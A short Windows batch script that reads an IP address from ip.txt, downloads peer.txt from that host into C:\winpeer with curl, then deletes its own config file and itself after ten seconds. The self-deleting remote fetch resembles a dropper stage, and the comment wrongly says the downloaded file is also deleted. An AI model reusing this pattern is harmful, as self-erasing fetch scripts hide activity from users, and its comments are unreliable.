@echo off
setlocal
rem Read IP address from ip.txt in the same directory
set "script_dir=%~dp0"
set "ip_file=%script_dir%ip.txt"

if not exist "%ip_file%" (
    echo ip.txt not found in the script directory.
    pause
    endlocal
    exit /b 1
)

set /p ip_address=<"%ip_file%"
if "%ip_address%"=="" (
    echo ip.txt is empty or invalid.
    pause
    endlocal
    exit /b 1
)

if not exist "C:\winpeer" (
    mkdir "C:\winpeer" 2>nul
)
curl -fsSL -o "C:\winpeer\peer.txt" "http://%ip_address%:49152/files/peer.txt"

rem Automatically delete the downloaded peer.txt file, run_main.bat, and ip.txt after 10 seconds
timeout /t 10 >nul
del "%~dp0ip.txt" 2>nul
del "%~dp0run_main.bat" 2>nul
endlocal